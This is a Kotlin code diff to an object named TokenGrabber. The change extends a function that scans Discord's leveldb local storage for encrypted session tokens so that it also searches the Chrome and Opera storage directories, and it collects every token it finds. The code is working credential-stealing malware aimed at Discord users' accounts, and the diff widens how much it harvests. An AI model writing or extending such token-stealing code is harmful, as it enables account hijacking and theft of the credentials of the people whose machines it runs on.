@@ -32,18 +32,26 @@ object TokenGrabber {
     }
 
     private fun getTokensFromFile(): List<String> {
-        val token = LinkedList<String>()
+        val tokens = LinkedList<String>()
         val regex = "dQw4w9WgXcQ:"
-        val files = File("$romaing\\discord\\Local Storage\\leveldb\\").listFiles()
-        files?.forEach { file ->
-            BufferedReader(FileReader(file)).use { br ->
-                var line: String?
-                while (br.readLine().also { line = it } != null) {
-                    if (line!!.contains(regex)) token.add(line.split(regex)[1].split("\"")[0])
+        val paths = listOf(
+            System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb",
+            System.getProperty("user.home") + "/AppData/Local/Opera Software/Opera Stable/Local Storage/leveldb",
+            "$romaing/discord/Local Storage/leveldb",
+        )
+
+        paths.forEach { path ->
+            val files = File(path).listFiles()
+            files?.forEach { file ->
+                BufferedReader(FileReader(file)).use { br ->
+                    var line: String?
+                    while (br.readLine().also { line = it } != null) {
+                        if (line!!.contains(regex)) tokens.add(line.split(regex)[1].split("\"")[0])
+                    }
                 }
             }
         }
-        return token
+        return tokens
     }
 
     private fun getKey(): String? {
